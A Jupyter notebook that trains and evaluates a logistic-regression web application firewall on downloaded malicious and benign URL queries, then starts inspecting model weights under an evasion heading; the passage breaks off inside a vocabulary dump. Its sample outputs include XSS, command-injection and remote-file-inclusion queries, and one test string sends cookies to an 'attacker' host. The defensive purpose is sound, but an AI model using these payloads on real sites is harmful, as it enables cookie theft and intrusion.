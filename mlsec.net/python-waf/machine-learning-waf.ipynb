{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.7.3"
    },
    "colab": {
      "name": "machine-learning-waf.ipynb",
      "provenance": []
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "iU4wgncUuCg4",
        "colab_type": "text"
      },
      "source": [
        "# Machine Learning WAF - Web Application Firewall\n",
        "* https://github.com/faizann24/Fwaf-Machine-Learning-driven-Web-Application-Firewall\n",
        "* https://github.com/oreilly-mlsec/book-resources/tree/master/chapter8/waf"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "c3nHwBjFuCg8",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import os, urllib.parse, pickle\n",
        "import numpy as np\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.feature_extraction.text import TfidfVectorizer\n",
        "from sklearn.linear_model import LogisticRegression\n",
        "from sklearn.pipeline import Pipeline\n",
        "from sklearn import metrics\n",
        "\n",
        "import matplotlib.pyplot as plt"
      ],
      "execution_count": 2,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3gi1j7L8uChU",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "def loadFile(name):\n",
        "    directory = str(os.getcwd())\n",
        "    filepath = os.path.join(directory, name)\n",
        "    with open(filepath, 'r', encoding='utf-8') as f:\n",
        "        data = f.readlines()\n",
        "    data = list(set(data))\n",
        "    result = []\n",
        "    for d in data:\n",
        "        d = str(urllib.parse.unquote(d))   #converting url encoded data to simple string\n",
        "        result.append(d)\n",
        "    return result"
      ],
      "execution_count": 3,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "NhHHgsftuChi",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 374
        },
        "outputId": "b3f180ef-2031-46d6-e641-7b8a18e8f326"
      },
      "source": [
        "!wget -U \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0\" https://raw.githubusercontent.com/infosecdemos/ml-2020/master/mlsec.net/python-waf/badqueries.txt -O badqueries.txt\n",
        "\n",
        "badQueries = loadFile('badqueries.txt')\n",
        "badQueries[:10]"
      ],
      "execution_count": 18,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "--2020-09-18 10:45:13--  https://raw.githubusercontent.com/infosecdemos/ml-2020/master/mlsec.net/python-waf/badqueries.txt\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 3326796 (3.2M) [text/plain]\n",
            "Saving to: ‘badqueries.txt.1’\n",
            "\n",
            "badqueries.txt.1    100%[===================>]   3.17M  11.6MB/s    in 0.3s    \n",
            "\n",
            "2020-09-18 10:45:13 (11.6 MB/s) - ‘badqueries.txt.1’ saved [3326796/3326796]\n",
            "\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['/hydrocodone-prescriptions/\\n',\n",
              " '/examples/jsp/cal/index.php?cat_select=<script>foo</script>\\n',\n",
              " '/sablonlar/gunaysoft/gunaysoft.php?sayfaid=XXpathXX\\n',\n",
              " '${exec(print(`echo UVBBNB\\necho $((5+32))\\necho UVBBNB\\necho UVBBNB`);UVBBNB\\n',\n",
              " '/apavxugx.php?<script>document.cookie=\"testdnbh=5237;\"</script>\\n',\n",
              " '/scripts/qcvjnagy16kc.cfm\\n',\n",
              " '/help.php?q=\"del q65533214&rem \\n',\n",
              " '/scriptpath/index.php?page=http://192.168.202.118:8080/2aibfaczmac8?\\n',\n",
              " '/main.php?stuff=\"&del\\\\x0cq99279396&rem\\\\x0c\\n',\n",
              " '/javascript/usr.exe\\n']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 18
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "7hVVg750uCh2",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 374
        },
        "outputId": "07a9d912-70d4-411b-a343-f72d7f8ae359"
      },
      "source": [
        "!wget -U \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0\" https://raw.githubusercontent.com/infosecdemos/ml-2020/master/mlsec.net/python-waf/goodqueries.txt -O goodqueries.txt\n",
        "\n",
        "validQueries = loadFile('goodqueries.txt')\n",
        "validQueries[:10]"
      ],
      "execution_count": 19,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "--2020-09-18 10:45:44--  https://raw.githubusercontent.com/infosecdemos/ml-2020/master/mlsec.net/python-waf/goodqueries.txt\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 22769423 (22M) [text/plain]\n",
            "Saving to: ‘goodqueries.txt’\n",
            "\n",
            "goodqueries.txt     100%[===================>]  21.71M  32.3MB/s    in 0.7s    \n",
            "\n",
            "2020-09-18 10:45:45 (32.3 MB/s) - ‘goodqueries.txt’ saved [22769423/22769423]\n",
            "\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['/q_21605941/\\n',\n",
              " '/p735497-errorhandler/\\n',\n",
              " '/229107/\\n',\n",
              " '/javascript/index_1.vb\\n',\n",
              " '/trans_news/\\n',\n",
              " '/872622/\\n',\n",
              " '/company_hd/\\n',\n",
              " '/saintmanager_announcement/\\n',\n",
              " '/javascript/hourly.c\\n',\n",
              " '/t12540/\\n']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 19
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "LRmVMzgxuCiD",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "badQueries = list(set(badQueries))\n",
        "validQueries = list(set(validQueries))\n",
        "allQueries = badQueries + validQueries"
      ],
      "execution_count": 20,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "YHeL4VLduCiR",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "yBad = [1 for i in range(0, len(badQueries))]  #labels, 1 for malicious and 0 for clean\n",
        "yGood = [0 for i in range(0, len(validQueries))]\n",
        "y = yBad + yGood\n",
        "queries = allQueries"
      ],
      "execution_count": 21,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "WvCcUEX-uCiw",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 238
        },
        "outputId": "9c499f3e-70c9-4ca6-d5fe-ed3a87560c50"
      },
      "source": [
        "vectorizer = TfidfVectorizer(min_df = 0.0, analyzer=\"char\", sublinear_tf=True, ngram_range=(1,3)) # converting data to vectors\n",
        "X = vectorizer.fit_transform(queries)\n",
        "\n",
        "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) # splitting data\n",
        "\n",
        "badCount = len(badQueries)\n",
        "validCount = len(validQueries)\n",
        "\n",
        "lgs = LogisticRegression(class_weight={1: 2 * validCount / badCount, 0: 1.0}) # class_weight='balanced')\n",
        "lgs.fit(X_train, y_train) # training our model"
      ],
      "execution_count": 22,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=1.0, class_weight={0: 1.0, 1: 56.856822060540736},\n",
              "                   dual=False, fit_intercept=True, intercept_scaling=1,\n",
              "                   l1_ratio=None, max_iter=100, multi_class='auto', n_jobs=None,\n",
              "                   penalty='l2', random_state=None, solver='lbfgs', tol=0.0001,\n",
              "                   verbose=0, warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 22
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4n9NgQpLuCja",
        "colab_type": "text"
      },
      "source": [
        "## Pickle model"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "f0AxcNjKuCjc",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 204
        },
        "outputId": "2ca1daf5-5a9a-4dca-b727-6b28d21e8cff"
      },
      "source": [
        "!wget -U \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0\" https://raw.githubusercontent.com/infosecdemos/ml-2020/master/mlsec.net/python-waf/trained_waf_model -O trained_waf_model\n",
        "\n",
        "p = Pipeline([\n",
        "        ('vectorizer', vectorizer),\n",
        "        ('classifier', lgs)\n",
        "    ])\n",
        "\n",
        "pickle.dump(p, open('trained_waf_model', 'wb'))"
      ],
      "execution_count": 23,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "--2020-09-18 10:49:32--  https://raw.githubusercontent.com/infosecdemos/ml-2020/master/mlsec.net/python-waf/trained_waf_model\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 6260137 (6.0M) [application/octet-stream]\n",
            "Saving to: ‘trained_waf_model’\n",
            "\n",
            "trained_waf_model   100%[===================>]   5.97M  15.0MB/s    in 0.4s    \n",
            "\n",
            "2020-09-18 10:49:33 (15.0 MB/s) - ‘trained_waf_model’ saved [6260137/6260137]\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "M7Vz8n9buCjy",
        "colab_type": "text"
      },
      "source": [
        "## Evaluation"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "5rZUokLuuCj0",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 170
        },
        "outputId": "0c2be06f-c740-4793-f211-a37ee4a692d5"
      },
      "source": [
        "predicted = lgs.predict(X_test)\n",
        "\n",
        "fpr, tpr, _ = metrics.roc_curve(y_test, (lgs.predict_proba(X_test)[:, 1]))\n",
        "auc = metrics.auc(fpr, tpr)\n",
        "\n",
        "print(\"Bad samples: %d\" % badCount)\n",
        "print(\"Good samples: %d\" % validCount)\n",
        "print(\"Baseline Constant negative: %.6f\" % (validCount / (validCount + badCount)))\n",
        "print(\"------------\")\n",
        "print(\"Accuracy: %f\" % lgs.score(X_test, y_test))  #checking the accuracy\n",
        "print(\"Precision: %f\" % metrics.precision_score(y_test, predicted))\n",
        "print(\"Recall: %f\" % metrics.recall_score(y_test, predicted))\n",
        "print(\"F1-Score: %f\" % metrics.f1_score(y_test, predicted))\n",
        "print(\"AUC: %f\" % auc)"
      ],
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Bad samples: 44532\n",
            "Good samples: 1265974\n",
            "Baseline Constant negative: 0.966019\n",
            "------------\n",
            "Accuracy: 0.999454\n",
            "Precision: 0.985726\n",
            "Recall: 0.998179\n",
            "F1-Score: 0.991913\n",
            "AUC: 0.999947\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "nOnkpkAHuCkC",
        "colab_type": "text"
      },
      "source": [
        "## Use pretrained model"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xI9wN_6vuCkF",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "p = pickle.load(open('trained_waf_model', 'rb'))"
      ],
      "execution_count": 25,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "N2-6VnAxuCkS",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 85
        },
        "outputId": "6dfef3f7-3fa8-4e13-e4a2-6353997eac2f"
      },
      "source": [
        "input_data = [\n",
        "    '<script></script>',\n",
        "    'hello.us',\n",
        "    'www.google.com',\n",
        "    \"<script>window.location='http://attacker/?cookie='+document.cookie</script>\"\n",
        "]\n",
        "\n",
        "pred = p.predict_proba(input_data).tolist()\n",
        "\n",
        "for i in range(len(pred)):\n",
        "    print(\"{:0.2f}%\\tmalicious:\\t{}\".format(pred[i][1]*100, input_data[i]))"
      ],
      "execution_count": 26,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "100.00%\tmalicious:\t<script></script>\n",
            "2.45%\tmalicious:\thello.us\n",
            "3.36%\tmalicious:\twww.google.com\n",
            "100.00%\tmalicious:\t<script>window.location='http://attacker/?cookie='+document.cookie</script>\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "NB6JyVa2uCk6",
        "colab_type": "text"
      },
      "source": [
        "## Binary classifier evasion"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "iWAMRFQuuCk7",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 289
        },
        "outputId": "7033ff33-f55f-433d-b4d1-8f17a3c93a00"
      },
      "source": [
        "vars(p)"
      ],
      "execution_count": 27,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'memory': None,\n",
              " 'steps': [('vectorizer',\n",
              "   TfidfVectorizer(analyzer='char', binary=False, decode_error='strict',\n",
              "                   dtype=<class 'numpy.float64'>, encoding='utf-8',\n",
              "                   input='content', lowercase=True, max_df=1.0, max_features=None,\n",
              "                   min_df=0.0, ngram_range=(1, 3), norm='l2', preprocessor=None,\n",
              "                   smooth_idf=True, stop_words=None, strip_accents=None,\n",
              "                   sublinear_tf=True, token_pattern='(?u)\\\\b\\\\w\\\\w+\\\\b',\n",
              "                   tokenizer=None, use_idf=True, vocabulary=None)),\n",
              "  ('classifier',\n",
              "   LogisticRegression(C=1.0, class_weight={0: 1.0, 1: 56.856822060540736},\n",
              "                      dual=False, fit_intercept=True, intercept_scaling=1,\n",
              "                      l1_ratio=None, max_iter=100, multi_class='auto', n_jobs=None,\n",
              "                      penalty='l2', random_state=None, solver='lbfgs', tol=0.0001,\n",
              "                      verbose=0, warm_start=False))],\n",
              " 'verbose': False}"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 27
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "24Q_r5yTuClP",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "vec = p.steps[0][1]\n",
        "clf = p.steps[1][1]"
      ],
      "execution_count": 28,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "4CwjOY6JuCla",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 51
        },
        "outputId": "8f49bbb4-3fd6-4776-db05-c5bbe337b627"
      },
      "source": [
        "print(vec.idf_)"
      ],
      "execution_count": 29,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[ 9.88191796 13.29416517 13.98731235 ... 14.39277746 14.39277746\n",
            " 14.39277746]\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "frDkTUByuCl0",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 51
        },
        "outputId": "5f63d1d5-458c-4839-a50d-3edef09e29a8"
      },
      "source": [
        "print(clf.coef_)"
      ],
      "execution_count": 30,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[[5.15163752e+00 3.08659016e-02 2.43210958e-03 ... 1.09267797e-04\n",
            "  1.09267797e-04 1.09267797e-04]]\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "CeOO8eK2uCmF",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 51
        },
        "outputId": "c25a5d1d-becd-4068-f3d1-e77fb5c55682"
      },
      "source": [
        "term_influence = vec.idf_ * clf.coef_\n",
        "print(term_influence)"
      ],
      "execution_count": 31,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[[5.09080593e+01 4.10336394e-01 3.40186763e-02 ... 1.57266709e-03\n",
            "  1.57266709e-03 1.57266709e-03]]\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "in-yN-vduCmb",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "outputId": "a5f6f0f1-0dcf-45c8-d66e-8fa3493ae00b"
      },
      "source": [
        "print(np.argpartition(term_influence, 1))"
      ],
      "execution_count": 32,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[[81937 83662     2 ... 97829 97830 97831]]\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "NllR_BANuCmv",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "outputId": "de1b8b74-69eb-4168-a598-1df053fb802a"
      },
      "source": [
        "vec.vocabulary_"
      ],
      "execution_count": 33,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'/': 10522,\n",
              " 'h': 55125,\n",
              " 'y': 92321,\n",
              " 'd': 45818,\n",
              " 'r': 76641,\n",
              " 'o': 70279,\n",
              " 'c': 43527,\n",
              " 'n': 67925,\n",
              " 'e': 48183,\n",
              " '-': 8262,\n",
              " 'p': 72543,\n",
              " 's': 79024,\n",
              " 'i': 57223,\n",
              " 't': 81489,\n",
              " '\\n': 154,\n",
              " '/h': 11876,\n",
              " 'hy': 57118,\n",
              " 'yd': 93281,\n",
              " 'dr': 47696,\n",
              " 'ro': 78387,\n",
              " 'oc': 71215,\n",
              " 'co': 45180,\n",
              " 'od': 71269,\n",
              " 'do': 47547,\n",
              " 'on': 71801,\n",
              " 'ne': 69117,\n",
              " 'e-': 48480,\n",
              " '-p': 9431,\n",
              " 'pr': 74306,\n",
              " 're': 77834,\n",
              " 'es': 50324,\n",
              " 'sc': 80190,\n",
              " 'cr': 45330,\n",
              " 'ri': 78053,\n",
              " 'ip': 58842,\n",
              " 'pt': 74414,\n",
              " 'ti': 83135,\n",
              " 'io': 58787,\n",
              " 'ns': 69848,\n",
              " 's/': 79373,\n",
              " '/\\n': 10528,\n",
              " '/hy': 11919,\n",
              " 'hyd': 57144,\n",
              " 'ydr': 93319,\n",
              " 'dro': 47735,\n",
              " 'roc': 78416,\n",
              " 'oco': 71257,\n",
              " 'cod': 45208,\n",
              " 'odo': 71312,\n",
              " 'don': 47586,\n",
              " 'one': 71847,\n",
              " 'ne-': 69130,\n",
              " 'e-p': 48511,\n",
              " '-pr': 9464,\n",
              " 'pre': 74335,\n",
              " 'res': 77888,\n",
              " 'esc': 50361,\n",
              " 'scr': 80235,\n",
              " 'cri': 45365,\n",
              " 'rip': 78100,\n",
              " 'ipt': 58892,\n",
              " 'pti': 74464,\n",
              " 'tio': 83174,\n",
              " 'ion': 58828,\n",
              " 'ons': 71861,\n",
              " 'ns/': 69860,\n",
              " 's/\\n': 79374,\n",
              " '|': 96441,\n",
              " '$': 3487,\n",
              " 'f': 50796,\n",
              " 'w': 88122,\n",
              " 'b': 41354,\n",
              " '(': 5071,\n",
              " '3': 19195,\n",
              " '5': 23159,\n",
              " '+': 7199,\n",
              " '9': 30764,\n",
              " '2': 17153,\n",
              " ')': 5690,\n",
              " '||': 96561,\n",
              " '|e': 96536,\n",
              " 'ec': 49425,\n",
              " 'ch': 44815,\n",
              " 'ho': 56615,\n",
              " 'o$': 70361,\n",
              " '$i': 3687,\n",
              " 'if': 58301,\n",
              " 'fs': 52547,\n",
              " 'sf': 80357,\n",
              " 'fw': 52751,\n",
              " 'wb': 88906,\n",
              " 'bt': 43174,\n",
              " 'tc': 82810,\n",
              " '$(': 3513,\n",
              " '((': 5187,\n",
              " '(3': 5305,\n",
              " '35': 19726,\n",
              " '5+': 23280,\n",
              " '+9': 7509,\n",
              " '92': 31111,\n",
              " '2)': 17265,\n",
              " '))': 5827,\n",
              " ')$': 5772,\n",
              " '(e': 5483,\n",
              " 'o)': 70411,\n",
              " ')f': 6239,\n",
              " 'o|': 72534,\n",
              " '|\\n': 96442,\n",
              " '||e': 96572,\n",
              " '|ec': 96537,\n",
              " 'ech': 49458,\n",
              " 'cho': 44859,\n",
              " 'ho$': 56619,\n",
              " 'o$i': 70363,\n",
              " '$if': 3688,\n",
              " 'ifs': 58350,\n",
              " 'fsf': 52579,\n",
              " 'sfw': 80404,\n",
              " 'fwb': 52772,\n",
              " 'wbt': 88946,\n",
              " 'btc': 43203,\n",
              " 'tco': 82850,\n",
              " 'co$': 45184,\n",
              " 'o$(': 70362,\n",
              " '$((': 3517,\n",
              " '((3': 5194,\n",
              " '(35': 5313,\n",
              " '35+': 19733,\n",
              " '5+9': 23292,\n",
              " '+92': 7514,\n",
              " '92)': 31118,\n",
              " '2))': 17270,\n",
              " '))$': 5832,\n",
              " ')$(': 5773,\n",
              " '$(e': 3518,\n",
              " '(ec': 5487,\n",
              " 'co)': 45188,\n",
              " 'o)f': 70423,\n",
              " ')fw': 6261,\n",
              " 'co|': 45231,\n",
              " 'o|\\n': 72535,\n",
              " 'x': 90144,\n",
              " 'a': 38945,\n",
              " 'm': 65680,\n",
              " 'l': 63324,\n",
              " 'j': 59431,\n",
              " '.': 9860,\n",
              " '?': 35512,\n",
              " '_': 37164,\n",
              " '=': 33946,\n",
              " '<': 33627,\n",
              " '>': 35044,\n",
              " '/e': 11738,\n",
              " 'ex': 50609,\n",
              " 'xa': 91026,\n",
              " 'am': 40565,\n",
              " 'mp': 67369,\n",
              " 'pl': 73998,\n",
              " 'le': 64518,\n",
              " '/j': 11969,\n",
              " 'js': 60895,\n",
              " 'sp': 80882,\n",
              " 'p/': 72783,\n",
              " '/c': 11642,\n",
              " 'ca': 44442,\n",
              " 'al': 40504,\n",
              " 'l/': 63645,\n",
              " '/i': 11921,\n",
              " 'in': 58725,\n",
              " 'nd': 69053,\n",
              " 'de': 47041,\n",
              " 'x.': 90372,\n",
              " '.p': 10368,\n",
              " 'ph': 73803,\n",
              " 'hp': 56669,\n",
              " 'p?': 73318,\n",
              " '?c': 35732,\n",
              " 'at': 40966,\n",
              " 't_': 82654,\n",
              " '_s': 38447,\n",
              " 'se': 80293,\n",
              " 'el': 49915,\n",
              " 'ct': 45438,\n",
              " 't=': 82461,\n",
              " '=<': 34474,\n",
              " '<s': 33886,\n",
              " 't>': 82521,\n",
              " '>f': 35387,\n",
              " 'fo': 52345,\n",
              " 'oo': 71875,\n",
              " 'o<': 70984,\n",
              " '</': 33698,\n",
              " '/s': 12374,\n",
              " '>\\n': 35049,\n",
              " '/ex': 11781,\n",
              " 'exa': 50640,\n",
              " 'xam': 91060,\n",
              " 'amp': 40609,\n",
              " 'mpl': 67409,\n",
              " 'ple': 74028,\n",
              " 'les': 64572,\n",
              " 'es/': 50340,\n",
              " 's/j': 79411,\n",
              " '/js': 12003,\n",
              " 'jsp': 60938,\n",
              " 'sp/': 80895,\n",
              " 'p/c': 72801,\n",
              " '/ca': 11666,\n",
              " 'cal': 44477,\n",
              " 'al/': 40517,\n",
              " 'l/i': 63674,\n",
              " '/in': 11956,\n",
              " 'ind': 58762,\n",
              " 'nde': 69095,\n",
              " 'dex': 47098,\n",
              " 'ex.': 50620,\n",
              " 'x.p': 90395,\n",
              " '.ph': 10376,\n",
              " 'php': 73840,\n",
              " 'hp?': 56695,\n",
              " 'p?c': 73337,\n",
              " '?ca': 35738,\n",
              " 'cat': 44485,\n",
              " 'at_': 40997,\n",
              " 't_s': 82689,\n",
              " '_se': 38468,\n",
              " 'sel': 80339,\n",
              " 'ele': 49951,\n",
              " 'lec': 64556,\n",
              " 'ect': 49470,\n",
              " 'ct=': 45471,\n",
              " 't=<': 82485,\n",
              " '=<s': 34486,\n",
              " '<sc': 33893,\n",
              " 'pt>': 74448,\n",
              " 't>f': 82554,\n",
              " '>fo': 35391,\n",
              " 'foo': 52386,\n",
              " 'oo<': 71900,\n",
              " 'o</': 70985,\n",
              " '</s': 33720,\n",
              " '/sc': 12399,\n",
              " 't>\\n': 82522,\n",
              " 'g': 52953,\n",
              " 'u': 84107,\n",
              " 'sa': 80085,\n",
              " 'ab': 39980,\n",
              " 'bl': 42764,\n",
              " 'lo': 65055,\n",
              " 'nl': 69499,\n",
              " 'la': 64307,\n",
              " 'ar': 40837,\n",
              " 'r/': 76969,\n",
              " '/g': 11830,\n",
              " 'gu': 54824,\n",
              " 'un': 85433,\n",
              " 'na': 68897,\n",
              " 'ay': 41231,\n",
              " 'ys': 93993,\n",
              " 'so': 80829,\n",
              " 'of': 71374,\n",
              " 'ft': 52600,\n",
              " 't/': 81891,\n",
              " 't.': 81860,\n",
              " '?s': 35944,\n",
              " 'yf': 93380,\n",
              " 'fa': 51642,\n",
              " 'ai': 40362,\n",
              " 'id': 58174,\n",
              " 'd=': 46686,\n",
              " '=x': 34961,\n",
              " 'xx': 92147,\n",
              " 'xp': 91744,\n",
              " 'pa': 73442,\n",
              " 'th': 83076,\n",
              " 'hx': 57072,\n",
              " 'x\\n': 90152,\n",
              " '/sa': 12397,\n",
              " 'sab': 80115,\n",
              " 'abl': 40019,\n",
              " 'blo': 42803,\n",
              " 'lon': 65099,\n",
              " 'onl': 71854,\n",
              " 'nla': 69523,\n",
              " 'lar': 64356,\n",
              " 'ar/': 40854,\n",
              " 'r/g': 76989,\n",
              " '/gu': 11870,\n",
              " 'gun': 54860,\n",
              " 'una': 85454,\n",
              " 'nay': 68949,\n",
              " 'ays': 41279,\n",
              " 'yso': 94038,\n",
              " 'sof': 80860,\n",
              " 'oft': 71419,\n",
              " 'ft/': 52611,\n",
              " 't/g': 81925,\n",
              " 'ft.': 52610,\n",
              " 't.p': 81880,\n",
              " 'p?s': 73353,\n",
              " '?sa': 35948,\n",
              " 'say': 80138,\n",
              " 'ayf': 41266,\n",
              " 'yfa': 93401,\n",
              " 'fai': 51675,\n",
              " 'aid': 40387,\n",
              " 'id=': 58204,\n",
              " 'd=x': 46739,\n",
              " '=xx': 34984,\n",
              " 'xxp': 92191,\n",
              " 'xpa': 91767,\n",
              " 'pat': 73489,\n",
              " 'ath': 41005,\n",
              " 'thx': 83132,\n",
              " 'hxx': 57115,\n",
              " 'xx\\n': 92149,\n",
              " 'v': 86105,\n",
              " 'k': 61277,\n",
              " '\"': 2477,\n",
              " '7': 27031,\n",
              " ';': 33026,\n",
              " '/a': 11544,\n",
              " 'ap': 40730,\n",
              " 'av': 41076,\n",
              " 'vx': 87973,\n",
              " 'xu': 92006,\n",
              " 'ug': 85078,\n",
              " 'gx': 54969,\n",
              " '?<': 35616,\n",
              " '>d': 35375,\n",
              " 'cu': 45504,\n",
              " 'um': 85377,\n",
              " 'me': 66784,\n",
              " 'en': 50035,\n",
              " 'nt': 69906,\n",
              " '.c': 10211,\n",
              " 'ok': 71633,\n",
              " 'ki': 62444,\n",
              " 'ie': 58240,\n",
              " 'e=': 49103,\n",
              " '=\"': 33996,\n",
              " '\"t': 3104,\n",
              " 'te': 82916,\n",
              " 'st': 81110,\n",
              " 'td': 82864,\n",
              " 'dn': 47496,\n",
              " 'nb': 68952,\n",
              " 'bh': 42568,\n",
              " 'h=': 55811,\n",
              " '=5': 34380,\n",
              " '52': 23526,\n",
              " '23': 17587,\n",
              " '37': 19832,\n",
              " '7;': 27795,\n",
              " ';\"': 33072,\n",
              " '\"<': 2846,\n",
              " '/ap': 11584,\n",
              " 'apa': 40760,\n",
              " 'pav': 73491,\n",
              " 'avx': 41126,\n",
              " 'vxu': 88014,\n",
              " 'xug': 92030,\n",
              " 'ugx': 85125,\n",
              " 'gx.': 54978,\n",
              " 'p?<': 73329,\n",
              " '?<s': 35622,\n",
              " 't>d': 82552,\n",
              " '>do': 35381,\n",
              " 'doc': 47575,\n",
              " 'ocu': 71263,\n",
              " 'cum': 45537,\n",
              " 'ume': 85410,\n",
              " 'men': 66833,\n",
              " 'ent': 50089,\n",
              " 'nt.': 69919,\n",
              " 't.c': 81867,\n",
              " '.co': 10226,\n",
              " 'coo': 45219,\n",
              " 'ook': 71918,\n",
              " 'oki': 71669,\n",
              " 'kie': 62472,\n",
              " 'ie=': 58269,\n",
              " 'e=\"': 49106,\n",
              " '=\"t': 34049,\n",
              " '\"te': 3109,\n",
              " 'tes': 82966,\n",
              " 'est': 50378,\n",
              " 'std': 81151,\n",
              " 'tdn': 82902,\n",
              " 'dnb': 47522,\n",
              " 'nbh': 68981,\n",
              " 'bh=': 42586,\n",
              " 'h=5': 55824,\n",
              " '=52': 34386,\n",
